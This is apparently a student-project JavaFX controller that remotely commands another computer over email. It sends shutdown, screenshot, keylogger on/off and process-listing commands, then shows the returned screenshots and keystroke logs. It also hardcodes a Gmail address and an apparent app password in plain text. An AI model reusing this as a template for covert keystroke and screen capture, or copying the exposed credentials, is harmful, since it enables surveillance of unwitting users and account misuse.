package com.example.project;

import com.example.project.mail.receiveMail;
import javafx.animation.PauseTransition;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.Group;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import javafx.scene.control.cell.PropertyValueFactory;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.input.KeyEvent;
import javafx.scene.input.MouseEvent;
import com.example.project.mail.sendMail;
import javafx.scene.layout.AnchorPane;
import javafx.stage.Stage;
import javafx.util.Duration;

import javax.swing.*;
import java.awt.*;
import javafx.scene.control.TextArea;

import java.io.*;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.ResourceBundle;
import java.util.Scanner;

public class ClientController {
    public String textControl;
    @FXML private Button buttonsd, buttonsl, buttonres,buttonlog,buttonscrshot,buttonzoom,buttonsaveasScr, buttonLogTurnOn,buttonLogTurnOff,buttonsaveasLog,buttonStartPrc,buttonStartApp;
    @FXML private Label responsePower;
    @FXML private ImageView scrshot;
    @FXML private TextArea LogText;

    public void handleExitImageClick(MouseEvent event) {
        Alert alert = new Alert(Alert.AlertType.CONFIRMATION, "Are you sure you want to exit?", ButtonType.YES, ButtonType.NO);
        alert.showAndWait();
        if (alert.getResult() == ButtonType.YES) {
            System.exit(0);
        }
    }

    private String to = "phimphu8@gmail.com";

    // Sender's email ID needs to be mentioned
    private String from = "projectmangmaytinh2004@gmail.com";
    private String username = "projectmangmaytinh2004@gmail.com";//change accordingly
    private String password = "gorabwfzyfuqfkgy";//change accordingly
    private String subject = "ScreenShot";
    private sendMail send = new sendMail(to, from,password,subject);
    private receiveMail receive = new receiveMail(username,password);
    public void OnButtonShutdown(ActionEvent event) throws IOException {
        if (!buttonsd.isDisabled()){
        comfirmRequest("shutdown");
        System.out.println("ok");
        }
    }
    public void OnButtonSleep(ActionEvent event) throws IOException{
        if (!buttonsl.isDisabled()){
            comfirmRequest("sleep");
        }
    }
    public void OnButtonRestart(ActionEvent event) throws IOException{
        if (!buttonres.isDisable()){
            comfirmRequest("restart");
        }
    }
    public void OnButtonLogout(ActionEvent event) throws IOException{
        if (!buttonlog.isDisable()){
            comfirmRequest("sleep");
        }
    }

    public void OnButtonScrshot(ActionEvent event) throws IOException{
        System.out.println("scrshot");
        Alert alert = new Alert(Alert.AlertType.CONFIRMATION, "Are you sure you want to  screenshoot?", ButtonType.YES, ButtonType.NO);
        alert.showAndWait();
        if (alert.getResult() == ButtonType.YES) {
            Platform.runLater(() -> {
                buttonscrshot.setDisable(true);
            });
            Thread newThread = new Thread(() -> {
                send.sendContent("screenshot");
                //Xóa file cũ nếu có
                /*File oldfile = new File("src/main/resources/com/example/project/image/screenshot.png");
                oldfile.delete();*/
                File file = new File("src/main/resources/com/example/project/image/screenshot.png");
                Image image = new Image(file.toURI().toString());
                Platform.runLater(() -> {
                    scrshot.setImage(image);
                    buttonscrshot.setDisable(false);
                    buttonzoom.setDisable(false);
                    buttonsaveasScr.setDisable(false);
                });
            });
            newThread.start();
        } else {
            buttonscrshot.setDisable(false);
        }
    }
    public void OnButtonZoom(ActionEvent event) throws IOException{
        if (!buttonzoom.isDisable()){
            Platform.runLater(()->{
                File file = new File("src/main/resources/com/example/project/image/screenshot.png");
                Image imageshow = new Image(file.toURI().toString());
                ImageView imageView = new ImageView(imageshow);
                imageView.setFitHeight(780);
                imageView.setFitWidth(1420);
                imageView.setPreserveRatio(true);
                Group root = new Group(imageView);
                Scene scene = new Scene(root, 1420, 780);
                Stage stage = new Stage();
                stage.setTitle("ScreenShot");
                stage.setResizable(false);
                stage.setScene(scene);
                stage.show();
            });
        }
    }
    public void OnButtonSaveas(ActionEvent event) throws IOException{
        System.out.println("saveas");
        String sourceFilePath = "src/main/resources/com/example/project/image/screenshot.png";
        if (!buttonsaveasScr.isDisable()){
            Platform.runLater(()->{
                FileDialog fileDialog = new FileDialog(new Frame(), "Save As", FileDialog.SAVE);
                fileDialog.setVisible(true);

                // Get the selected file and directory
                String selectedFile = fileDialog.getFile();
                String selectedDirectory = fileDialog.getDirectory();

                // Check if the user canceled the file dialog
                if (selectedFile == null || selectedDirectory == null) {
                    System.out.println("Save operation canceled by the user.");
                    return;
                }

                // Construct the destination path
                Path destinationPath = Path.of(selectedDirectory, selectedFile);

                try {
                    // Copy the file to the chosen destination
                    Files.copy(Path.of(sourceFilePath), destinationPath, StandardCopyOption.REPLACE_EXISTING);

                    System.out.println("File saved successfully to: " + destinationPath);
                } catch (Exception e) {
                    e.printStackTrace();
                    System.out.println("Error saving file.");
                }
            });
        }
    }
    public void OnButtonLogTurnOn(ActionEvent event) throws IOException{
        Alert alert = new Alert(Alert.AlertType.CONFIRMATION, "Are you sure you want to keylogger?", ButtonType.YES, ButtonType.NO);
        alert.showAndWait();
        if (alert.getResult() == ButtonType.YES) {
            Platform.runLater(() -> {
                buttonLogTurnOn.setDisable(true);
            });
            Thread newThread = new Thread(() -> {
                send.sendContent("keylogger turnon");
                Platform.runLater(() -> {
                    buttonLogTurnOff.setDisable(false);
                });
            });
            newThread.start();
        } else {
            buttonscrshot.setDisable(false);
        }
    }
    public void OnButtonLogTurnOff(ActionEvent event) throws IOException{
        if (!buttonLogTurnOff.isDisable()){
            Platform.runLater(() -> {
                buttonLogTurnOff.setDisable(true);
            });
            Thread newThread = new Thread(() -> {
                send.sendContent("keylogger turnoff");
                receive.receiveMail();
                String text = receive.getText();
                File oldfile = new File("src/main/resources/com/example/project/file/keylog.txt");
                oldfile.delete();
                File file = new File("src/main/resources/com/example/project/file/keylog.txt");
                try {
                    file.createNewFile();
                    FileWriter write = new FileWriter(file);
                    write.write(text);
                    write.close();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
                Platform.runLater(() -> {
                    LogText.setText(text);
                    buttonLogTurnOff.setDisable(false);
                    buttonsaveasLog.setDisable(false);
                    buttonLogTurnOn.setDisable(false);
                });
            });
            newThread.start();
        }
    }
    public void OnButtonSaveasLog(ActionEvent event) throws IOException{
        System.out.println("saveas");
        String sourceFilePath = "src/main/resources/com/example/project/file/keylog.txt";
        if (!buttonsaveasLog.isDisable()){
            Platform.runLater(()->{
                FileDialog fileDialog = new FileDialog(new Frame(), "Save As", FileDialog.SAVE);
                fileDialog.setVisible(true);

                // Get the selected file and directory
                String selectedFile = fileDialog.getFile();
                String selectedDirectory = fileDialog.getDirectory();

                // Check if the user canceled the file dialog
                if (selectedFile == null || selectedDirectory == null) {
                    System.out.println("Save operation canceled by the user.");
                    return;
                }

                // Construct the destination path
                Path destinationPath = Path.of(selectedDirectory, selectedFile);

                try {
                    // Copy the file to the chosen destination
                    Files.copy(Path.of(sourceFilePath), destinationPath, StandardCopyOption.REPLACE_EXISTING);

                    System.out.println("File saved successfully to: " + destinationPath);
                } catch (Exception e) {
                    e.printStackTrace();
                    System.out.println("Error saving file.");
                }
            });
        }
    }
    public void comfirmRequest(String pow) {
        Alert alert = new Alert(Alert.AlertType.CONFIRMATION, "Are you sure you want to " + pow + "?", ButtonType.YES, ButtonType.NO);
        alert.showAndWait();
        if (alert.getResult() == ButtonType.YES) {
            Platform.runLater(() -> {
                buttonsd.setDisable(true);
                buttonsl.setDisable(true);
                buttonres.setDisable(true);
                buttonlog.setDisable(true);
            });
            Thread newThread = new Thread(() -> {
                send.sendContent(pow);
                Platform.runLater(() -> {
                    buttonsd.setDisable(false);
                    buttonsl.setDisable(false);
                    buttonres.setDisable(false);
                    buttonlog.setDisable(false);
                    responsePower.setText("Successfull!");
                });
            });
            newThread.start();
        } else {
            buttonsd.setDisable(false);
            buttonsl.setDisable(false);
            buttonres.setDisable(false);
            buttonlog.setDisable(false);
            responsePower.setText("");
        }
    }
    //Manager process
    @FXML
    private TableView<TaskInfo.Process> prc_Table;
    @FXML
    private TableColumn<TaskInfo.Process, String> prc_ProcessName;
    @FXML
    private TableColumn<TaskInfo.Process, String> prc_PID;
    @FXML
    private TableColumn<TaskInfo.Process ,String> prc_SessionName;
    @FXML
    private TableColumn<TaskInfo.Process, String> prc_Session;
    @FXML
    private TableColumn<TaskInfo.Process, String> prc_MemUsage;
    private ObservableList<TaskInfo.Process> ProcessList;

    public void OnStartPrc(ActionEvent event){
        Platform.runLater(()->{
            buttonStartPrc.setDisable(true);
        });
        Thread thread = new Thread(()->{
            send.sendContent("getprocess");
            //receive maill
            Platform.runLater(()->{
                System.out.println("ok");
                ProcessList = FXCollections.observableArrayList();
                prc_ProcessName.setCellValueFactory(new PropertyValueFactory<TaskInfo.Process, String>("prc_ProcessName"));
                prc_PID.setCellValueFactory(new PropertyValueFactory<TaskInfo.Process, String>("prc_PID"));
                prc_SessionName.setCellValueFactory(new PropertyValueFactory<TaskInfo.Process, String>("prc_SessionName"));
                prc_Session.setCellValueFactory(new PropertyValueFactory<TaskInfo.Process, String>("prc_Session"));
                prc_MemUsage.setCellValueFactory(new PropertyValueFactory<TaskInfo.Process, String>("prc_MemUsage"));
                loadDataFromFile();
                prc_Table.setItems(ProcessList);
                buttonStartPrc.setDisable(false);
            });
        });
        thread.start();
    }
    public void loadDataFromFile() {
        File file = new File("src/main/resources/com/example/project/file/listPrc.txt");
        try (BufferedReader br = new BufferedReader(new FileReader(file))) {
            String line;
            while ((line = br.readLine()) != null) {
                System.out.println(line);
                String[] data = line.split("\\|");
                if (data.length >= 5) {
                    TaskInfo.Process taskInfo = new TaskInfo.Process(data[0], data[1], data[2], data[3], data[4]);
                    ProcessList.add(taskInfo);
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    //Application
    @FXML
    private TableView<TaskInfo.Application> app_Table;
    @FXML
    private TableColumn<TaskInfo.Application,String> app_Name;
    private ObservableList<TaskInfo.Application> Applist;
    public void OnButtonStartApp(ActionEvent event){
        Platform.runLater(()->{
            buttonStartApp.setDisable(true);
        });
        Thread thread = new Thread(()->{
            send.sendContent("getapplication");
            //receive maill
            Platform.runLater(()->{
                System.out.println("ok");
                Applist = FXCollections.observableArrayList();
                app_Name.setCellValueFactory(new PropertyValueFactory<TaskInfo.Application, String>("app_Name"));
                loadAppFromFile();
                app_Table.setItems(Applist);
                buttonStartApp.setDisable(false);
            });
        });
        thread.start();
    }
    public void loadAppFromFile() {
        File file = new File("src/main/resources/com/example/project/file/listApp.txt");
        try (BufferedReader br = new BufferedReader(new FileReader(file))) {
            String line;
            br.readLine();
            while ((line = br.readLine()) != null) {
                System.out.println(line);
                TaskInfo.Application taskinfo = new TaskInfo.Application(line);
                Applist.add(taskinfo);
                }
            }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
}

